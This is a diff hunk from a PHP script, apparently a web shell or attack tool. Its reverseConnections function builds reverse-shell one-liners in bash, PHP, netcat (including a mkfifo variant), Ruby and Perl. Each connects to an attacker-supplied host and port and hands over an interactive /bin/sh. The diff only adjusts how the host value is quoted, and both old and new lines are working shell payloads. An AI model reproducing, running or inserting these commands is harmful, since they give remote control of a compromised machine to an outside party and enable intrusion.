@@ -278,12 +278,12 @@ function reverseConnections($methods, $host, $port, $shell)
         $usePort = $port;
     }
     $comma = array(
-        "bash" => "bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1",
+        "bash" => "bash -i >& /dev/tcp/{$useHost}/" . $usePort . " 0>&1",
         "php" => "nohup php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
-        "nc" => "nc -e " . $useShell . " " . $useHost . " " . $usePort,
-        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc " . $useHost . " " . $usePort . " >/tmp/f",
-        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(" . $useHost . "," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "perl" => "perl -e 'use Socket;\$i=" . $useHost . ";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort,
+        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
+        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
     );
     $defaultAction = $comma["bash"];
     if (!empty($methods)) {
